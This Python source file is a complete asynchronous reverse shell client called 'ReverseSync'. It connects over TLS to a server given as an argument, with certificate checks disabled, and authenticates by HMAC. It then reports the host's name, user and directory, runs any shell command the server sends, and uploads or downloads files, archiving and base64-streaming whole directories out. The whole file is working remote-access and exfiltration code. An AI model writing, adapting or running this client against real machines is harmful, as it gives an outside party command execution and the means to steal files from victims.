import argparse
import asyncio
import base64
import getpass
import hashlib
import hmac
import shutil
import ssl
import json
import os
import struct
from asyncio import CancelledError, IncompleteReadError
from pathlib import Path
from sysInfo import TargetSysInfo

def parse_arguments():
    """
    Parses command-line arguments for the ReverseShellClient.

    Returns:
        argparse.Namespace: Parsed arguments with default values set.
    """
    parser = argparse.ArgumentParser(
        prog="reversync-client",
        description=(
            "ReverseSync Client - A secure asynchronous Python reverse shell client.\n"
            "Connects to a remote server over TLS, performs HMAC auth, and executes commands."
        ),
        epilog="Example: python client.py --host 192.168.1.10 --port 443"
    )

    parser.add_argument(
        '--host', '-H',
        default='127.0.0.1',
        help='Server IP address to connect to (default: 127.0.0.1)'
    )

    parser.add_argument(
        '--port', '-p',
        type=int,
        default=1234,
        help='Server port to connect to (default: 1234)'
    )

    return parser.parse_args()


def resolve_path(path: str) -> str:
    """
    Resolves the path to an absolute path, handling user home (~) and empty input.
    """
    if not path:
        return str(Path.home())
    if path.startswith('~'):
        return str(Path(path).expanduser())
    return str(Path(path).absolute())

def check_permission(file: str) -> bool:
    try:
        with open(file, 'a'):
            return True
    except PermissionError:
        return False


class ReverseShellClient:
    """
    Reverse shell client that connects to a server and executes shell commands remotely.
    """

    def __init__(self,SERVER_HOST,SERVER_PORT):
        self.reader = None
        self.writer = None
        self.current_directory = os.getcwd()
        self.client_info = TargetSysInfo()
        self.SERVER_HOST = SERVER_HOST
        self.SERVER_PORT = SERVER_PORT

    async def perform_hmac_authentication(self) -> bool:
        """
        Performs client-side HMAC-based challenge-response authentication.

        Steps:
        1. Waits to receive a random challenge from the server.
        2. Prompts the user to enter their shared secret (password).
        3. Computes HMAC using the shared secret and received challenge.
        4. Sends the HMAC back to the server.
        5. Waits for server response indicating success ("accept") or failure.

        Returns:
            True if the server accepts the authentication, False otherwise.
        """
        # Step 1: Receive the challenge from the server
        challenge = await self.reader.read(1024)

        # Step 2: Prompt the user for the shared secret
        shared_secret = getpass.getpass("Enter shared secret: ").encode()

        # Step 3: Compute HMAC of the challenge using the secret
        hmac_response = hmac.new(shared_secret, challenge, hashlib.sha256).digest()

        # Step 4: Send the computed HMAC to the server
        self.writer.write(hmac_response)
        await self.writer.drain()

        # Step 5: Wait for server confirmation
        header = await self.reader.readexactly(4)
        length = struct.unpack(">I", header)[0]
        server_reply = await self.reader.read(length)
        server_reply = json.loads(server_reply)
        return server_reply['status'] == 'accept'

    def setup_data(self, stdout: str, stderr: str = '', dtype: str = '') -> bytes:
        data = {
            'stdout': stdout,
            'stderr': stderr,
            'type': dtype,
            'cwd': self.client_info.cwd,
            'hostname': self.client_info.hostname,
            'username': self.client_info.username
        }
        return json.dumps(data, indent=4).encode('ascii')

    async def transferring(self, file):
        try:
            if Path(file).is_dir():
                file = shutil.make_archive(Path(file).name, 'tar', root_dir=file.removesuffix(Path(file).name),
                                           base_dir=Path(file).name)
            # Send initial 'start' command to notify the receiver of an incoming file
            data = json.dumps({'cmd':'pull','stat': 'start', 'type': 'file', 'source_file': Path(file).name})
            await self.send_output(self.setup_data(dtype=data,stdout=''))

            # Open the file in binary read mode
            with open(file, 'rb') as f:
                chunk_size = 8192  # 8KB per chunk
                total_size = Path(file).stat().st_size  # Get total size for progress tracking

                await self.send_output(self.setup_data(stdout=f'Transferring file {Path(file).name}'))

                while True:
                    # Read next chunk from file
                    chunk = f.read(chunk_size)

                    # If no more data, break the loop
                    if not chunk:
                        break

                    # Encode chunk as base64 and send with 'sending' status
                    encoded_data = base64.b64encode(chunk).decode('ascii')
                    data = json.dumps({'cmd':'pull','stat': 'sending', 'type': 'file', 'source_file': Path(file).name,'data': encoded_data})
                    await self.send_output(self.setup_data(dtype=data,stdout=''))

                # Send final 'end' message to signal the transfer is complete
                data = json.dumps({'cmd':'pull','stat': 'end', 'type': 'file', 'source_file': Path(file).name})
                await self.send_output(self.setup_data(dtype=data,stdout=''))

                await self.send_output(self.setup_data(stdout=f'All files have been successfully transferred'))

        # Handle common file-related errors gracefully
        except PermissionError:
            await self.send_output(self.setup_data(stderr=f'Permission denied: {file}', stdout=''))
        except FileNotFoundError:
            await self.send_output(self.setup_data(stderr=f'No such file: {file}', stdout=''))



    async def save_file(self, file_name, save_path, file_stat, data):
        if file_stat == 'end':
            await self.send_output(self.setup_data(stdout=f"[+] File '{file_name}' saved to {save_path}\n"
                                                          + f"[+] File size: {save_path.stat().st_size} bytes"))
            return
        if file_stat == 'sending':
            file_data = base64.b64decode(data['data'])
            with open(save_path, 'ab') as file:
                file.write(file_data)
            return
        return

    async def run_process(self, command):
        # Execute shell command asynchronously
        process = await asyncio.create_subprocess_shell(
            command,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.getcwd()
        )

        output, stderr = await asyncio.create_task(process.communicate())  # await process.communicate()

        # Send the output back to the server
        await self.send_output(
            self.setup_data(stdout=output.decode().strip(), stderr=stderr.decode().strip()))

    async def send_output(self, data: bytes):
        """
        Sends command output back to the server.
        """
        length = struct.pack(">I", len(data))
        self.writer.write(length + data)
        await self.writer.drain()

    async def connect_and_listen(self):
        """
        Connects to the reverse shell server and listens for commands to execute.
        """
        try:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            self.reader, self.writer = await asyncio.open_connection(self.SERVER_HOST,
                                                                     self.SERVER_PORT,
                                                                     ssl=ssl_ctx
                                                                     )
            auth = await self.perform_hmac_authentication()
            if not auth:
                print(f"[-] Connection refused by {self.SERVER_HOST}:{self.SERVER_PORT}")
                return None
            print(f"[+] Connected to reverse shell server at {self.SERVER_HOST}:{self.SERVER_PORT}")
            await self.send_output(self.setup_data(stdout=self.client_info.__str__()).strip())

            while True:
                # Receive a command from the server
                header = await self.reader.readexactly(4)
                length = struct.unpack(">I", header)[0]
                data = await self.reader.read(length)
                data = json.loads(data.decode('ascii'))
                command = data['cmd'].strip()

                if not command:
                    print(f"[-] Connection closed by {self.SERVER_HOST}:{self.SERVER_PORT}")
                    self.writer.close()
                    await self.writer.wait_closed()
                    break

                if command == "sysinfo":
                    await self.send_output(self.setup_data(stdout=self.client_info.__str__()))
                    continue

                if command == "push":
                    file_name = data['source_file']
                    destination_path = data['destination'] or os.getcwd()
                    file_stat = data['stat']
                    destination_path = resolve_path(destination_path)
                    if not Path(destination_path).exists():
                        await self.send_output(self.setup_data(stderr=f'{destination_path} does not exist', stdout=''))
                        continue
                    if not Path(destination_path).is_dir():
                        await self.send_output(self.setup_data(stderr=f'{destination_path} is not a Directory', stdout=''))
                        continue
                    if not check_permission(destination_path):
                        await self.send_output(self.setup_data(stdout='', stderr=f'Permission denied: {destination_path}'))
                        continue
                    save_path = Path(destination_path) / file_name
                    if file_stat == 'pending':
                        save_path.touch()
                        data = json.dumps({'cmd': 'push', 'stat': 'start', 'type': 'file', 'destination_path': destination_path})
                        await self.send_output(self.setup_data(dtype=data, stdout=''))
                        continue
                    asyncio.create_task(self.save_file(file_name, save_path, file_stat, data))
                    continue

                if command == "pull":
                    file = resolve_path(data['file'])
                    asyncio.create_task(self.transferring(file)) # transferring files
                    continue
                try:
                    # Handle change directory (cd) command
                    if command.startswith("cd ") or command == "cd":
                        print('[-] Changing directory. Before:', os.getcwd())
                        os.chdir(resolve_path(command[3:]))
                        self.current_directory = os.getcwd()
                        response = f"[+] Changed directory to: {self.current_directory}"
                        print('[+] After:', os.getcwd())
                        await self.send_output(self.setup_data(stdout=response))
                        continue

                    print(f"[>] Executing command: {command} (Current directory: {os.getcwd()})")
                    asyncio.create_task(self.run_process(command))

                except FileNotFoundError:
                    await self.send_output(
                        self.setup_data(stdout='', stderr=f"[-] No such file or directory: {command}"))
                except NotADirectoryError:
                    await self.send_output(self.setup_data(stdout='', stderr=f"[-] Not a directory: {command}"))
                except PermissionError:
                    await self.send_output(self.setup_data(stdout='', stderr=f"[-] Permission denied: {command}"))
        except CancelledError:
            print("[-] Interrupted by user. Closing connection.")
            # do something
        except ConnectionRefusedError as e:
            print("[-] Connection failed: Server refused the connection. Verify IP, port, and server status.")
            # do something
        except ConnectionResetError as e:
            print(e)
        except IncompleteReadError as e:
            print(f"[-] Connection closed by {self.SERVER_HOST}:{self.SERVER_PORT}")
        except OSError:
            print(f"[-] Connect call failed {self.SERVER_HOST}:{self.SERVER_PORT}")


async def main():
    """
    Entry point for the asynchronous reverse shell client.
    """
    args = parse_arguments()
    SERVER_HOST = args.host
    SERVER_PORT = args.port
    client = ReverseShellClient(SERVER_HOST,SERVER_PORT)
    await client.connect_and_listen()


# Start the async event loop
asyncio.run(main())